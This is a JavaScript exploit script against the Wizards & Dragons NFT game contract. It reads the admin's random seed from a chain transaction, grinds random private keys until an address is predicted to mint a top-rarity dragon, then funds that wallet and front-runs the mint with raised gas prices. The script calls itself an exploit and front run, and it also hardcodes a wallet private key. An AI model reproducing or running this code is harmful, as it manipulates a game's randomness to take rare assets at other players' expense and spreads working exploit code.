//web3 set up
const Web3 = require('web3')
const web3 = new Web3('ws://127.0.0.1:8545') 
var ethers = require('ethers');  
var crypto = require('crypto');
provider = new ethers.providers.WebSocketProvider('ws://127.0.0.1:8545')
const wnd_cr_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"MintCommitted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"MintRevealed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"seed","type":"uint256"}],"name":"addCommitRandom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"allowCommits","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"alter","outputs":[{"internalType":"contract ISacrificialAlter","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"canMint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"deleteCommit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"forceRevealCommit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"getPendingMint","outputs":[{"components":[{"internalType":"bool","name":"stake","type":"bool"},{"internalType":"uint16","name":"amount","type":"uint16"}],"internalType":"struct WnDGameCR.MintCommit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"gpToken","outputs":[{"internalType":"contract IGP","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"hasMintPending","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint16","name":"qty","type":"uint16"}],"name":"makeTreasureChests","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"stake","type":"bool"}],"name":"mintCommit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"maxTokens","type":"uint256"}],"name":"mintCost","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"mintReveal","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"gpAmt","type":"uint256"}],"name":"payTribute","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"removeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"gpAmt","type":"uint256"}],"name":"sacrifice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint16","name":"qty","type":"uint16"}],"name":"sellTreasureChests","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"allowed","type":"bool"}],"name":"setAllowCommits","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_gp","type":"address"},{"internalType":"address","name":"_traits","type":"address"},{"internalType":"address","name":"_wnd","type":"address"},{"internalType":"address","name":"_tower","type":"address"},{"internalType":"address","name":"_alter","type":"address"}],"name":"setContracts","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"setMaxGpCost","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"_paused","type":"bool"}],"name":"setPaused","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"pendingAmt","type":"uint256"}],"name":"setPendingMintAmt","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"typeId","type":"uint256"}],"name":"setTreasureChestId","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"tower","outputs":[{"internalType":"contract ITower","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"traits","outputs":[{"internalType":"contract ITraits","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"treasureChestTypeId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"wndNFT","outputs":[{"internalType":"contract IWnD","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
const wnd_cr_addr = "0x1C5194668FaAb6a895b1febBF3dc219077cDd732"
const abiDecoder = require('abi-decoder') // NodeJS
abiDecoder.addABI(wnd_cr_ABI);
const account = '0xC7dEFA20Ec54917669f29e15D1ACB7c121b4780c'.toLowerCase();

//global variables
var tx_seed = null
var gas = null
var gasPrice = null
var gasPrice_up = null
console.log(`Listening for game admin...\n`)

async function checkLastBlock() {
    let block = await web3.eth.getBlock('latest');
    console.log(`[*] Searching block ${ block.number }...`);
    if (block && block.transactions) {
        for (let tx of block.transactions) {
            let transaction = await web3.eth.getTransaction(tx);
            if (account === transaction.from.toLowerCase()) {
                console.log(`[+] Transaction found on block ${ block.number }`);
                const decodedData = abiDecoder.decodeMethod(transaction.input);
                console.log({ address_from: transaction.from, timestamp: new Date(), original_input_data: transaction.input, Gas_Price: transaction.gasPrice, Gas: transaction.gas});
                tx_seed = ethers.BigNumber.from(decodedData.params[0].value)
                gas = transaction.gas
                gasPrice = transaction.gasPrice
                console.log(`SEED VALUE OBTAINED: ${ tx_seed }`);
                //console.log(transaction)
            }
        }
    }
}

const interval = setInterval(() => {
    if (tx_seed != null){
        clearInterval(interval)
        console.log('Exiting block checking')
    } else {
        checkLastBlock()
    }

}, 2000)


async function send(web3, transaction, priv_key) {
    while (true) {
        try {
            var options = {
                to   : transaction._parent._address,
                data : transaction.encodeABI(),
                gas  : gas_up.toFixed(0),
                gasPrice: gasPrice_up.toFixed(0)
            };
            var signed  = await web3.eth.accounts.signTransaction(options, priv_key);
            //console.log("Data: ", transaction.encodeABI())
            //this data can be passed into a flashbots bundle
            var receipt = await web3.eth.sendSignedTransaction(signed.rawTransaction);
            console.log("Tx Receipt: ", receipt)
            return receipt;
        }
        catch (error) {
            console.log(error.message);
            console.log("Press enter to try again...");
            await new Promise(function(resolve, reject) {
                process.stdin.resume();
                process.stdin.once("data", function(data) {
                    process.stdin.pause();
                    resolve();
                });
            });
        }
    }
}

async function send_eth(web3, to, value, priv_key) {
    while (true) {
        try {
            var options = {
                to   : to,
                value : value,
                gas  : gas_up.toFixed(0),
                gasPrice: gasPrice_up.toFixed(0)
            };
            var signed  = await web3.eth.accounts.signTransaction(options, priv_key);
            var receipt = await web3.eth.sendSignedTransaction(signed.rawTransaction);
            console.log("Tx Receipt: ", receipt)
            return receipt;
        }
        catch (error) {
            console.log(error.message);
            console.log("Press enter to try again...");
            await new Promise(function(resolve, reject) {
                process.stdin.resume();
                process.stdin.once("data", function(data) {
                    process.stdin.pause();
                    resolve();
                });
            });
        }
    }
}


function wizardMath(txSeed, address, debug) {
    // seed = uint256(keccak256(abi.encode(seed, addr)));
    const seed = ethers.BigNumber.from(ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ["uint256", "address"], [ethers.BigNumber.from(txSeed), address])));
    const result = {};
    if (debug) {
      console.log(`wizmath for seed ${seed.toHexString()} and address ${address}`);
      console.log(`- overall seed is ${seed.toString()}`);
    }
   
    // Will it be stolen? bit shifting logic
    // if (((seed >> 245) % 10) != 0) return _msgSender();
    const stealHash = seed.shr(245);
    const stealMod = stealHash.mod(10);
    result.stolen = (stealMod.toNumber() == 0);
    if (debug) {
      console.log(`- stolen: ${stealHash.toHexString()} mod 10 is ${stealMod.toNumber()}: ${result.stolen}`);
    }
    if (result.stolen) {
      return result;
    }
    // Is it a dragon?
    // t.isWizard = (seed & 0xFFFF) % 10 != 0;
    const dragonHash = seed.and(0xffff);
    const dragonMod = dragonHash.mod(10);
    result.dragon = (dragonMod.toNumber() == 0);
    if (debug) {
      console.log(`- dragon: ${dragonHash.toHexString()} mod 10 is ${dragonMod.toNumber()}: ${result.dragon}`);
    }
    if (!result.dragon) {
      return result;
    }


    //alpha calculation
        /**
    * selects the species and all of its traits based on the seed value
    * @param seed a pseudorandom 256 bit number to derive traits from
    * @return t -  a struct of randomly selected traits
    */
        //  function selectTraits(uint256 seed) internal view returns (WizardDragon memory t) {    
        //     t.isWizard = (seed & 0xFFFF) % 10 != 0;
        //     uint8 shift = t.isWizard ? 0 : 9;
    const alphaStartSeed = seed.shr(9 * 16);
    const alphaSeed = alphaStartSeed.and(0xffff);
   
    // // rankIndex
    // rarities[17] = [14, 155, 80, 255];
    // aliases[17] = [2, 3, 3, 3];
    /**
    * uses A.J. Walker's Alias algorithm for O(1) rarity table lookup
    * ensuring O(1) instead of O(n) reduces mint cost by more than 50%
    * probability & alias tables are generated off-chain beforehand
    * @param seed portion of the 256 bit seed to remove trait correlation
    * @param traitType the trait type to select a trait for 
    * @return the ID of the randomly selected trait
    */
    // uint8 trait = uint8(seed) % uint8(rarities[traitType].length);
    // // If a selected random trait probability is selected (biased coin) return that trait
    // if (seed >> 8 < rarities[traitType][trait]) return trait;
    // return aliases[traitType][trait];
    const rarities = [14, 155, 80, 255];
    const aliases = [2, 3, 3, 3];
    const trait = alphaSeed.mod(256).mod(4).toNumber();
    let alphaIndex = 0;
    if (alphaSeed.shr(8) < rarities[trait]) {
      alphaIndex = trait;
    } else {
      alphaIndex = aliases[trait];
    }
    result.alpha = 8 - alphaIndex;
    if (debug) {
        console.log(`- alpha: ${result.alpha} based on alpha index: ${alphaIndex}`);
      }
    return result;
  }

//generate wallets
let dragon_found = false;
var private_key = null
var wallet = null

const interval2 = setInterval(() => {

    if (tx_seed != null){
        while (dragon_found === false){
            console.log("----------------------------------------------------------------------------------------------------------------------")
            var id = crypto.randomBytes(32).toString('hex');
            private_key = "0x"+id;
            console.log("Private Key:", private_key);
            wallet = new ethers.Wallet(private_key, provider);
            console.log("Address: " + wallet.address);
            console.log("")
            result = wizardMath(tx_seed, wallet.address, true)

            // if (result.dragon){
            //     dragon_found = true
            //     console.log("DRAGON FOUND!") 
            //     clearInterval(interval2)
          
            // }

            //for alpha 8s only
            if (result.dragon && result.alpha === 8){
                dragon_found = true
                console.log("ALPHA 8 DRAGON FOUND!")      
                clearInterval(interval2)
            }

            //sanity check that this is alpha 6 not stolen dragon wallet
            //var wallet = "0x16b8C69E65F385B42806dA4D3c6C9bE96939A16F"
            //wizardMath(tx_seed, wallet, true)
        }

    }

}, 2000)

  
//add in wallet that will be doing the transfer to the generated wallet
var user_priv_key = "0x69e46ead64811dda233cfa664a00cbb34f1ef9bda48bc27bcf414a985ad1eb13"
var user_wallet = new ethers.Wallet(user_priv_key, provider)

//address for GP
const GP_ADDRESS = "0x38Ec27c6F05a169e7eD03132bcA7d0cfeE93C2C5";
const GP_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"removeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"updateOriginAccess","outputs":[],"stateMutability":"nonpayable","type":"function"}]
const wnd_cr_contract = new web3.eth.Contract(wnd_cr_ABI, wnd_cr_addr)
const wnd_cr_contract_ethers = new ethers.Contract(wnd_cr_addr, wnd_cr_ABI, wallet)

const GP_contract = new web3.eth.Contract(GP_ABI, GP_ADDRESS)

var eth_sent = false

async function sendEthGP() {
    //establish wallet and transaction
    //let walletSigner = user_wallet.connect(provider)
    console.log("sending ETH")
    gas_up = gas + 100000

    //highest gas here for sending eth first
    gasPrice_up = gasPrice * 2

    //send eth to generated wallet using web3 js
    var sent_eth = await send_eth(web3, wallet.address, ethers.utils.parseEther("0.75"), user_priv_key)

    //send to generated wallet using ethersjs
    // const tx = {
    //     to: wallet.address,
    //     value: ethers.utils.parseEther("0.75"),
    //     gasPrice: gasPrice_up.toFixed(0),
    //     gasLimit: gas_up.toFixed(0),
    //     }

    // Send a transaction
    //await user_wallet.sendTransaction(tx)
    const balance = await provider.getBalance(user_wallet.address)
    await console.log("Remaining ETH balance: ", ethers.utils.formatEther(balance))
    // .then((txObj) => {
    //     console.log('txHash', txObj.hash)
    // })
    //var receipt = await send(web3, web3.eth.sendTransaction(user_wallet.address, true, private_key, true))
    //var receipt = await send(web3, true, private_key, true)
    //await console.log(receipt)
    //testing the generated wallet can work in ethersjs
    // const tx2 = {
    //     to: user_wallet.address,
    //     value: ethers.utils.parseEther("0.3"),
    //     gasPrice: gasPrice_up.toFixed(0),
    //     gasLimit: gas_up,
    //     }
    // await wallet.sendTransaction(tx2)

    const balance2 = await provider.getBalance(wallet.address)
    await console.log("Balance of new wallet: ", ethers.utils.formatEther(balance2))

    //send GP
    console.log("sending GP")

    //second highest gas here
    gasPrice_up = gasPrice * 1.75

    //var numberOfDecimals = 18;
    //var numberOfTokens = ethers.utils.parseUnits('3', numberOfDecimals);

    //change GP amount here, 0 to 48000; this is using web3 js
    var receipt = await send(web3, GP_contract.methods.transfer(wallet.address, 0), user_priv_key)
    // await GP_contract.methods
    // .transfer(wallet.address, 0)
    // .send({
    // from: user_wallet.address,
    // gas: gas_up,
    // gasPrice: gasPrice_up.toFixed(0),
    // })
    // .on("receipt", async (response) => {
    // console.log(response);
    // })

    eth_sent = true
    console.log("TOKENS SUCCESSFULLY TRANSFERRED")    

}

async function claim() {

    gas_up = gas + 1000000

    //third highest gas
    gasPrice_up = gasPrice * 1.5
    console.log("Gas Price: ", gasPrice_up)
    console.log("Minting Address: ", wallet.address)
    console.log("Minting Private Key: ", private_key)

    var receipt = await send(web3, wnd_cr_contract.methods.mintCommit(1, true), private_key);
    await console.log(receipt)

    //call version, will not change state
    // await wnd_cr_contract.methods.mintCommit(1, true).call({
    //     from: wallet.address,
    //     gas: gas_up,
    //     gasPrice: gasPrice_up,
    //     }
    // , function(error, result){
    // console.log(error)
    // })

    //ethersjs version of calling mintcommit
    // var options = { from: wallet.address, gasPrice: gas_up }
    // await wnd_cr_contract_ethers.mintCommit(1, true, options);
    // var minted = await wnd_cr_contract_ethers.mintCommit(1, true, options);
    // const transactionReceipt = await minted.wait();
    // if (transactionReceipt.status !== 1) {
    //    alert('error message');
    //    return;
    // }

    
}

// you will need an account that has eth and GoldPoints in it to transfer to the wallet of the dragon
const interval3 = setInterval(() => {

    if(dragon_found === true) {
        console.log("----------------------------------------------------------------------------------------------------------------------")
        console.log("Beginning Front Run")

        sendEthGP()
        clearInterval(interval3)

    }

}, 3000)

//front run the transaction and claim mint
const interval4 = setInterval(() => {

    if(eth_sent === true){
        console.log("----------------------------------------------------------------------------------------------------------------------")
        console.log("Claiming mint")

        claim()

        clearInterval(interval4)
        console.log("EXPLOIT COMPLETE")    

    }

}, 3000)